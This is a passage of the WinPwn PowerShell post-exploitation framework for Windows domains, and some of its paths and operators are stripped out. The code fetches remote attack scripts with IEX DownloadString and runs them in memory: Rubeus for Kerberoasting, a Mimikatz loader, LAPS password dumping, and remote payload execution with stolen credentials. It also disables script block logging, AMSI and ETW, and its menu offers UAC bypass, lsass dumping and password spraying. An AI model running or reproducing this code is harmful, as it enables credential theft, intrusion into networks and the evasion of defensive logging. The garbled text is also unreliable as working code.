    $currentPath = (Get-Item -Path . -Verbose).FullName

    IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + 'Credsmasterobfuscatedpswmicmd.ps1')
    if (Test-Path $currentPathExploitationLocalAdminAccess.txt)
    {
        $exploitHosts = Get-Content $currentPathExploitationLocalAdminAccess.txt
    }
    else
    {
        $file = $currentPathExploitationExploited.txt
        While($i -ne quit) 
        {
          If ($i -ne $NULL) 
            {
            $i.Trim()  Out-File $file -append
          }
          $i = Read-Host -Prompt 'Please provide one or more IP-Adress as target'    
        }

    }

    $stagerfile = $currentPathExploitationStager.txt
    While($Payload -ne quit) 
    {
      If ($Payload -ne $NULL) 
        {
          $Payload.Trim()  Out-File $stagerfile -append
      }
        $Payload = Read-Host -Prompt 'Please provide the code to execute '
    }
    
    $executionwith = Read-Host -Prompt 'Use the current User for Payload Execution (yesno)'

    if (Test-Path $currentPathExploitationExploited.txt)
    {
        $Hosts = Get-Content $currentPathExploitationExploited.txt
    }
    else {$Hosts = Get-Content $currentPathExploitationLocalAdminAccess.txt}

    if ($executionwith -eq yes -or $executionwith -eq y -or $executionwith -eq Yes -or $executionwith -eq Y)
    {
        $Hosts  bootblacks -OnVxcvnOYdGIHyL $Payload
    }
    else 
    {
        $Credential = Get-Credential
        $Hosts  bootblacks -OnVxcvnOYdGIHyL $Payload -bOo9UijDlqABKpS $Credential
    }
}

function Shareenumeration
{
    #
        .DESCRIPTION
        Enumerates Shares in the current network, also searches for sensitive Files on the local System + Network.
        Author @S3cur3Th1sSh1t
        License BSD 3-Clause
    #
    #Enumeration Phase
    [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput   
    )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path . -Verbose).FullName

    IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + 'Credsmasterobfuscatedpsview.ps1')
    Write-Host -ForegroundColor Yellow 'Searching for sensitive Files on the Domain-Network, this can take a while'
    if(!$consoleoutput){Claire  $currentPathSensitiveFiles.txt}else{Claire}
    if(!$consoleoutput){shift -qgsNZggitoinaTA  $currentPathNetworkshares.txt}else{shift -qgsNZggitoinaTA}
}

function groupsearch
{
    #
        .DESCRIPTION
        AD can be searched for specific UserGroup Relations over Group Policies.
        Author @S3cur3Th1sSh1t
        License BSD 3-Clause
    #
    #Enumeration Phase
    [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput   
    )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path . -Verbose).FullName

    iex ($viewdevobfs)
    $user = Read-Host -Prompt 'Do you want to search for other users than the session-user (yesno)'
            if ($user -eq yes -or $user -eq y -or $user -eq Yes -or $user -eq Y)
            {
                Write-Host -ForegroundColor Yellow 'Please enter a username to search for'
                $username = Get-Credential
                $group = Read-Host -Prompt 'Please enter a Group-Name to search for (Administrators,RDP)'
                Write-Host -ForegroundColor Yellow 'Searching...'
                rewires -LocalGroup $group -Credential $username  $currentPathGroupsearches.txt
            }
            else
            {
                $group = Read-Host -Prompt 'Please enter a Group-Name to search for (Administrators,RDP)'
                Write-Host -ForegroundColor Yellow 'Searching...'
                rewires -LocalGroup $group -Identity $envUserName  $currentPathGroupsearches.txt
                Write-Host -ForegroundColor Yellow 'Systems saved to  $currentPathGroupsearches.txt'
            }
}

function proxydetect
{
    #
        .DESCRIPTION
        Checks, if a proxy is active. Uses current users credentials for Proxy Access  other user input is possible as well.
        Author @S3cur3Th1sSh1t
        License BSD 3-Clause
    #    
    #Proxy Detect #1
    
    Write-Host -ForegroundColor Yellow 'Searching for network proxy...'

    $reg2 = [Microsoft.Win32.RegistryKey]OpenRemoteBaseKey('CurrentUser', $envCOMPUTERNAME)
    $regkey2 = $reg2.OpenSubkey(SOFTWAREMicrosoftWindowsCurrentVersionInternet Settings)

    if ($regkey2.GetValue('ProxyServer') -and $regkey2.GetValue('ProxyEnable'))
    {
        $proxy = Read-Host -Prompt 'Proxy detected! Proxy is '$regkey2.GetValue('ProxyServer')'! Does the Powershell-User have proxy rights (yesno)'
        if ($proxy -eq yes -or $proxy -eq y -or $proxy -eq Yes -or $proxy -eq Y)
        {
             #Proxy
            Write-Host -ForegroundColor Yellow 'Setting up Powershell-Session Proxy Credentials...'
            $Wcl = new-object System.Net.WebClient
            $Wcl.Proxy.Credentials = [System.Net.CredentialCache]DefaultNetworkCredentials
        }
        else
        {
            Write-Host -ForegroundColor Yellow 'Please enter valid credentials, or the script will fail!'
            #Proxy Integration manual user
            $webclient=New-Object System.Net.WebClient
            $creds=Get-Credential
            $webclient.Proxy.Credentials=$creds
        }
   }
    else {Write-Host -ForegroundColor Yellow 'No proxy detected, continuing... '}
}

function Kerberoasting
{
    [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput   
    )
    #Exploitation Phase
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path . -Verbose).FullName

    Write-Host -ForegroundColor Red 'Kerberoasting active'
        
    Write-Host -ForegroundColor Yellow 'Doing Kerberoasting + ASRepRoasting using rubeus. Output goes to .Exploitation'
    iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'PowerSharpPackmasterPowerSharpBinariesInvoke-Rubeus.ps1')
    if(!$consoleoutput){Invoke-Rubeus -Command asreproast formathashcat nowrap outfile$currentPathExploitationASreproasting.txt}else{Invoke-Rubeus -Command asreproast formathashcat nowrap}
    if(!$consoleoutput){Invoke-Rubeus -Command kerberoast formathashcat nowrap outfile$currentPathExploitationKerberoasting_Rubeus.txt}else{Invoke-Rubeus -Command kerberoast formathashcat nowrap}
  Write-Host -ForegroundColor Yellow 'Using the powershell version as backup '
}

function inv-phantom {
    if (isadmin)
    {
        IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + 'Credsmasterobfuscatedpsphantom.ps1')
        phantom
    }
    else 
    { 
        Write-Host -ForegroundColor Yellow 'You are not admin, do something else for example Privesc -P'
        Sleep 3;
    }
}

filter ConvertFrom-SDDL
{
  #
      .SYNOPSIS
      Author Matthew Graeber (@mattifestation)
      .LINK
      httpwww.exploit-monday.com
  #

    Param (
        [Parameter( Position = 0, Mandatory = $True, ValueFromPipeline = $True )]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $RawSDDL
    )

    $RawSDDL = $RawSDDL -replace `n`r
    Set-StrictMode -Version 2

    # Get reference to sealed RawSecurityDescriptor class
    $RawSecurityDescriptor = [Int].Assembly.GetTypes()   { $_.FullName -eq 'System.Security.AccessControl.RawSecurityDescriptor' }

    # Create an instance of the RawSecurityDescriptor class based upon the provided raw SDDL
    try
    {
        $Sddl = [Activator]CreateInstance($RawSecurityDescriptor, [Object[]] @($RawSDDL))
    }
    catch [Management.Automation.MethodInvocationException]
    {
        throw $Error[0]
    }
    if ($Sddl.Group -eq $null)
    {
        $Group = $null
    }
    else
    {
        $SID = $Sddl.Group
        $Group = $SID.Translate([Security.Principal.NTAccount]).Value
    }
    if ($Sddl.Owner -eq $null)
    {
        $Owner = $null
    }
    else
    {
        $SID = $Sddl.Owner
        $Owner = $SID.Translate([Security.Principal.NTAccount]).Value
    }
    $ObjectProperties = @{
        Group = $Group
        Owner = $Owner
    }
    if ($Sddl.DiscretionaryAcl -eq $null)
    {
        $Dacl = $null
    }
    else
    {
        $DaclArray = New-Object PSObject[](0)
        $ValueTable = @{}
        $EnumValueStrings = [Enum]GetNames([System.Security.AccessControl.CryptoKeyRights])
        $CryptoEnumValues = $EnumValueStrings  % {
                $EnumValue = [Security.AccessControl.CryptoKeyRights] $_
                if (-not $ValueTable.ContainsKey($EnumValue.value__))
                {
                    $EnumValue
                }
                $ValueTable[$EnumValue.value__] = 1
            }
        $EnumValueStrings = [Enum]GetNames([System.Security.AccessControl.FileSystemRights])
        $FileEnumValues = $EnumValueStrings  % {
                $EnumValue = [Security.AccessControl.FileSystemRights] $_
                if (-not $ValueTable.ContainsKey($EnumValue.value__))
                {
                    $EnumValue
                }
                $ValueTable[$EnumValue.value__] = 1
            }
        $EnumValues = $CryptoEnumValues + $FileEnumValues
        foreach ($DaclEntry in $Sddl.DiscretionaryAcl)
        {
            $SID = $DaclEntry.SecurityIdentifier
            $Account = $SID.Translate([Security.Principal.NTAccount]).Value
            $Values = New-Object String[](0)

            # Resolve access mask
            foreach ($Value in $EnumValues)
            {
                if (($DaclEntry.Accessmask -band $Value) -eq $Value)
                {
                    $Values += $Value.ToString()
                }
            }
            $Access = $($Values -join ',')
            $DaclTable = @{
                Rights = $Access
                IdentityReference = $Account
                IsInherited = $DaclEntry.IsInherited
                InheritanceFlags = $DaclEntry.InheritanceFlags
                PropagationFlags = $DaclEntry.PropagationFlags
            }
            if ($DaclEntry.AceType.ToString().Contains('Allowed'))
            {
                $DaclTable['AccessControlType'] = [Security.AccessControl.AccessControlType]Allow
            }
            else
            {
                $DaclTable['AccessControlType'] = [Security.AccessControl.AccessControlType]Deny
            }
            $DaclArray += New-Object PSObject -Property $DaclTable
        }
        $Dacl = $DaclArray
    }
    $ObjectProperties['Access'] = $Dacl
    $SecurityDescriptor = New-Object PSObject -Property $ObjectProperties
    Write-Output $SecurityDescriptor
}

Function Get-Installedsoftware {
    [CmdletBinding(SupportsShouldProcess=$true)]
    param(
        [Parameter(ValueFromPipeline              =$true,
                   ValueFromPipelineByPropertyName=$true,
                   Position=0
        )]
        [string[]]
            $ComputerName = $envCOMPUTERNAME,
        [Parameter(Position=0)]
        [string[]]
            $Property,
        [string[]]
            $IncludeProgram,
        [string[]]
            $ExcludeProgram,
        [switch]
            $ProgramRegExMatch,
        [switch]
            $LastAccessTime,
        [switch]
            $ExcludeSimilar,
        [int]
            $SimilarWord
    )

    begin {
        $RegistryLocation = 'SOFTWAREMicrosoftWindowsCurrentVersionUninstall',
                            'SOFTWAREWow6432NodeMicrosoftWindowsCurrentVersionUninstall'

        if ($psversiontable.psversion.major -gt 2) {
            $HashProperty = [ordered]@{}    
        } else {
            $HashProperty = @{}
            $SelectProperty = @('ComputerName','ProgramName')
            if ($Property) {
                $SelectProperty += $Property
            }
            if ($LastAccessTime) {
                $SelectProperty += 'LastAccessTime'
            }
        }
    }

    process {
        foreach ($Computer in $ComputerName) {
            try {
                $socket = New-Object Net.Sockets.TcpClient($Computer, 445)
                if ($socket.Connected) {
                    $RegBase = [Microsoft.Win32.RegistryKey]OpenRemoteBaseKey([Microsoft.Win32.RegistryHive]LocalMachine,$Computer)
                    $RegistryLocation  ForEach-Object {
                        $CurrentReg = $_
                        if ($RegBase) {
                            $CurrentRegKey = $RegBase.OpenSubKey($CurrentReg)
                            if ($CurrentRegKey) {
                                $CurrentRegKey.GetSubKeyNames()  ForEach-Object {
                                    $HashProperty.ComputerName = $Computer
                                    $HashProperty.ProgramName = ($DisplayName = ($RegBase.OpenSubKey($CurrentReg$_)).GetValue('DisplayName'))
                                    
                                    if ($IncludeProgram) {
                                        if ($ProgramRegExMatch) {
                                            $IncludeProgram  ForEach-Object {
                                                if ($DisplayName -notmatch $_) {
                                                    $DisplayName = $null
                                                }
                                            }
                                        } else {
                                            $IncludeProgram  ForEach-Object {
                                                if ($DisplayName -notlike $_) {
                                                    $DisplayName = $null
                                                }
                                            }
                                        }
                                    }

                                    if ($ExcludeProgram) {
                                        if ($ProgramRegExMatch) {
                                            $ExcludeProgram  ForEach-Object {
                                                if ($DisplayName -match $_) {
                                                    $DisplayName = $null
                                                }
                                            }
                                        } else {
                                            $ExcludeProgram  ForEach-Object {
                                                if ($DisplayName -like $_) {
                                                    $DisplayName = $null
                                                }
                                            }
                                        }
                                    }

                                    if ($DisplayName) {
                                        if ($Property) {
                                            foreach ($CurrentProperty in $Property) {
                                                $HashProperty.$CurrentProperty = ($RegBase.OpenSubKey($CurrentReg$_)).GetValue($CurrentProperty)
                                            }
                                        }
                                        if ($LastAccessTime) {
                                            $InstallPath = ($RegBase.OpenSubKey($CurrentReg$_)).GetValue('InstallLocation') -replace '$',''
                                            if ($InstallPath) {
                                                $WmiSplat = @{
                                                    ComputerName = $Computer
                                                    Query        = $(ASSOCIATORS OF {Win32_Directory.Name='$InstallPath'} Where ResultClass = CIM_DataFile)
                                                    ErrorAction  = 'SilentlyContinue'
                                                }
                                                $HashProperty.LastAccessTime = Get-WmiObject @WmiSplat 
                                                    Where-Object {$_.Extension -eq 'exe' -and $_.LastAccessed} 
                                                    Sort-Object -Property LastAccessed 
                                                    Select-Object -Last 1  ForEach-Object {
                                                        $_.ConvertToDateTime($_.LastAccessed)
                                                    }
                                            } else {
                                                $HashProperty.LastAccessTime = $null
                                            }
                                        }
                                        
                                        if ($psversiontable.psversion.major -gt 2) {
                                            [pscustomobject]$HashProperty
                                        } else {
                                            New-Object -TypeName PSCustomObject -Property $HashProperty 
                                            Select-Object -Property $SelectProperty
                                        }
                                    }
                                    $socket.Close()
                                }

                            }

                        }

                    }
                }
            } catch {
                Write-Error $_
            }
        }
    }
}

function Lapschecks
{
    [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput,
        [Switch]
        $passworddump   
    )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path . -Verbose).FullName

    if ($passworddump)
    {
        IEX ($viewdevobfs)
        if(!$consoleoutput){breviaries -Properties DnsHostName,ms-Mcs-AdmPwd  $currentPathExploitationLapsPasswords.txt}else{Write ------- Dumping LAPS passwords;breviaries -Properties DnsHostName,ms-Mcs-AdmPwd}
    }

    IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + 'CredsmasterPowershellScriptsLAPSToolkit.ps1')
    Write-Host Checking for LAPS enabled Computers.
    if(!$consoleoutput){Get-LAPSComputers  $currentPathDomainReconLapsInformations.txt}else{Write ------- LAPS Computers;Get-LAPSComputers}
    Write-Host Checking for LAPS Administrator groups.
    if(!$consoleoutput){Find-LAPSDelegatedGroups  $currentPathDomainReconLapsAllowedAdminGroups.txt}else{Write ------- LAPS Groups;Find-LAPSDelegatedGroups}
    Write-Host Checking for special right users with access to laps passwords.
    if(!$consoleoutput){Find-AdmPwdExtendedRights  $currentPathDomainReconLapsSpecialRights.txt}else{Write ------- LAPS ADM Extended Rights;Find-AdmPwdExtendedRights}
}

function fruit
{
   $network = Read-Host -Prompt 'Please enter the CIDR for the network (example 192.168.0.024)'
   Write-Host -ForegroundColor Yellow 'Searching...'
   iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'CredsmasterPowershellScriptsFind-Fruit.ps1')
   Find-Fruit -FoundOnly -Rhosts $network
   pause;    
}

function Mimiload
{
  iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'Credsmasterobfuscatedpsloadmimi.ps1')
  mimiload
}

function BlockEtw
{
  iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'CredsmasterPowershellScriptsInvoke-BlockETW.ps1')
  Invoke-BlockETW
}
    
function WinPwn
{
    #
        .DESCRIPTION
        Main Function. Executes the other functions according to the users input.
        Author @S3cur3Th1sSh1t
        License BSD 3-Clause
    #
         [CmdletBinding()]
    Param (
    [alias(help)][Switch]$h,
	[String]
        $repo,
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput,
        [Switch]
        $Domainrecon,
        [Switch]
        $Localrecon,
        [Switch]
        $Privesc,
        [Switch]
        $PowerSharpPack,
        [Switch]
        $Uacbypass,
        [string]
        $command,
        [string]
        $technique,
        [switch]
        $credentialmanager,
        [switch]
        $mimikittie,
        [switch]
        $rundll32lsass,
        [switch]
        $lazagne,
        [switch]
        $browsercredentials,
        [switch]
        $mimikittenz,
        [switch]
        $wificredentials,
        [switch]
        $samdump,
        [switch]
        $sharpcloud   
    )
  scriptblocklogbypass
  
  @'

             
__        ___       ____                 
        (_)_ __   _ __      ___ __  
       '_  _)      '_  
   V  V        __  V  V    
   __  __ __     __ _ _

   -- Automate some internal Penetrationtest processes

'@

  $Help = 


    Usage



    WinPwn without any parameters is meant to be used in an interactive shell. There is a guided menu - no need for explanations.

    However you can pass several parameters to use it from your favorite C2-Framework. 

    -noninteractive 	- No questions for functions so that they run with predefined or user defined parameters  
            
    -consoleoutput    - The lootreport folders are not created. Every function returns the output to the console so that you can take a look at everything in the Agent logs of your C2-Framework 

    -repo	- Choose your own offline repo to use all those nice scripts in an environment without internet for example 

    Examples



    WinPwn -noninteractive -consoleoutput -DomainRecon 		- This will return every single domain recon script and function and will probably give you really much output

    WinPwn -noninteractive -consoleoutput -Localrecon 		- This will enumerate as much information for the local system as possible
														   
    Generalrecon -noninteractive							- Execute basic local recon functions and store the output in the corresponding folders

    UACBypass -noninteractive -command 'Ctempstager.exe' -technique ccmstp	- Execute a stager in  a high integrity process from a low privileged session
    Kittielocal -noninteractive -consoleoutput -browsercredentials				- Dump Browser-Credentials via Sharpweb returning the output to console
    Kittielocal -noninteractive -browsercredentials								- Dump SAM File NTLM-Hashes and store the output in a file
    WinPwn -PowerSharpPack -consoleoutput -noninteractive					    - Execute Seatbelt, PowerUp, Watson and more C# binaries in memory
    WinPwn -repo http192.168.1.108000WinPwn_Repo	- Execute WinPwn from a local repo. To create such a repo use the Get_WinPwn_Repo.sh script.
  
  if($h){return $Help}
	
    if(!$consoleoutput)
    {
        dependencychecks
        pathcheck
    }
    $currentPath = (Get-Item -Path . -Verbose).FullName
    AmsiBypass
	
	#Added repo parameter by 0x23353435
	If ($repo)
    {
    $ScriptS3cur3Th1sSh1t_repo = $repo
    }
    else
    {
    $ScriptS3cur3Th1sSh1t_repo = httpsraw.githubusercontent.comS3cur3Th1sSh1t
    }
	
    BlockEtw
	

    if ($noninteractive)
    {
        if ($Domainrecon)
        {
            if(!$consoleoutput){domainreconmodules -noninteractive}else{domainreconmodules -noninteractive -consoleoutput}
        }
        if ($Localrecon)
        {
            if(!$consoleoutput){localreconmodules -noninteractive}else{localreconmodules -noninteractive -consoleoutput}
        }
        if ($Privesc)
        {
            if(!$consoleoutput){privescmodules -noninteractive}else{privescmodules -noninteractive -consoleoutput}
        }
        if ($PowerSharpPack)
        {
            if(!$consoleoutput){sharpcradle -allthosedotnet -noninteractive}else{sharpcradle -allthosedotnet -noninteractive -consoleoutput}
        }
        if ($Uacbypass)
        {
            if (ccmstp, DiskCleanup, magic -notcontains $technique)
            {
                Write-Host Invalid technique, choose from ccmstp DiskCleanup or magic
                return
            }
            UACBypass -noninteractive -command $command -technique $technique
        }
        if ($credentialmanager)
        {
            if(!$consoleoutput){kittielocal -noninteractive -credentialmanager}else{kittielocal -noninteractive -credentialmanager -consoleoutput}
        }
        if($mimikittie)
        {
            if(!$consoleoutput){kittielocal -noninteractive -mimikittie}else{kittielocal -noninteractive -mimikittie -consoleoutput}
        }
        if($rundll32lsass)
        {
            if(!$consoleoutput){kittielocal -noninteractive -rundll32lsass}else{kittielocal -noninteractive -rundll32lsass -consoleoutput}
        }
        if($lazagne)
        {
            if(!$consoleoutput){kittielocal -noninteractive -lazagne}else{kittielocal -noninteractive -lazagne -consoleoutput}
        }
        if($browsercredentials)
        {
            if(!$consoleoutput){kittielocal -noninteractive -browsercredentials}else{kittielocal -noninteractive -browsercredentials -consoleoutput}
        }
        if($mimikittenz)
        {
            if(!$consoleoutput){kittielocal -noninteractive -mimikittenz}else{kittielocal -noninteractive -mimikittenz -consoleoutput}
        }
        if($wificredentials)
        {
            if(!$consoleoutput){kittielocal -noninteractive -wificredentials}else{kittielocal -noninteractive -wificredentials -consoleoutput}
        }
        if ($samdump)
        {
            if(!$consoleoutput){kittielocal -noninteractive -samdump}else{kittielocal -noninteractive -samdump -consoleoutput}
        }
        if ($sharpcloud)
        {
            if(!$consoleoutput){kittielocal -noninteractive -sharpcloud}else{kittielocal -noninteractive -sharpcloud -consoleoutput}
        } 
        return;
    }

    do
    {
        Write-Host ================ WinPwn ================
        Write-Host -ForegroundColor Green '1. Execute Inveigh - ADIDNSLLMNRmDNSNBNS spoofer! '
        Write-Host -ForegroundColor Green '2. Local recon menu! '
        Write-Host -ForegroundColor Green '3. Domain recon menu! '
        Write-Host -ForegroundColor Green '4. Local privilege escalation check menu! '
        Write-Host -ForegroundColor Green '5. Get SYSTEM using Windows vulnerabilities! '
	Write-Host -ForegroundColor Green '6. Bypass UAC! '
	Write-Host -ForegroundColor Green '7. Get a SYSTEM Shell! '
        Write-Host -ForegroundColor Green '8. Kerberoasting! '
        Write-Host -ForegroundColor Green '9. Loot local Credentials! '
        Write-Host -ForegroundColor Green '10. Create an ADIDNS node or remove it! '
        Write-Host -ForegroundColor Green '11. Sessiongopher! '
        Write-Host -ForegroundColor Green '12. Kill the event log services for stealth! '
	Write-Host -ForegroundColor Green '13. PowerSharpPack menu!'
	Write-Host -ForegroundColor Green '14. Load custom C# Binaries from a webserver to Memory and execute them!'
	Write-Host -ForegroundColor Green '15. DomainPasswordSpray Attacks!'
	Write-Host -ForegroundColor Green '16. Reflectively load Mimik@tz into memory!'
	Write-Host -ForegroundColor Green '17. Dump lsass via various techniques!'
        Write-Host -ForegroundColor Green '18. Exit. '
        Write-Host ================ WinPwn ================
        $masterquestion = Read-Host -Prompt 'Please choose wisely, master'

        Switch ($masterquestion) 
        {
			1{Inveigh}
			2{localreconmodules}
			3{domainreconmodules}
			4{privescmodules}
			5{kernelexploits}
			6{UACBypass}
			7{SYSTEMShell}
			8{kerberoasting}
			9{kittielocal}
			10{adidnsmenu}
			11{sessionGopher}
                        12{inv-phantom}
                        13{sharpcradle -allthosedotnet}
			14{sharpcradle -web}
                        15{domainpassspray}
			16{mimiload}
			17{lsassdumps}
    }
    }
  While ($masterquestion -ne 18)
     
   
}

$Certify = (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + 'PowerSharpPackmasterPowerSharpBinariesInvoke-Certify.ps1')
$SystemDirectoryServicesProtocols = (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + 'CredsmasterPowershellScriptsSystemDirectoryServicesProtocols-Import.ps1')
$viewdevobfs = (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + 'Credsmasterobfuscatedpsviewdevobfs.ps1')
$admodule = (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'CredsmasterPowershellScriptsADModuleImport.ps1')

function scriptblocklogbypass
{
  $GroupPolicyField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetFie`ld('cachedGroupPolicySettings', 'N'+'onPublic,Static')
  If ($GroupPolicyField) {
        $GroupPolicyCache = $GroupPolicyField.GetValue($null)
        If ($GroupPolicyCache['ScriptB'+'lockLogging']) {
            $GroupPolicyCache['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging'] = 0
            $GroupPolicyCache['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging'] = 0
        }
        $val = [System.Collections.Generic.Dictionary[string,System.Object]]new()
        $val.Add('EnableScriptB'+'lockLogging', 0)
        $val.Add('EnableScriptB'+'lockInvocationLogging', 0)
        $GroupPolicyCache['HKEY_LOCAL_MACHINESoftwarePoliciesMicrosoftWindowsPowerShellScriptB'+'lockLogging'] = $val
  }
}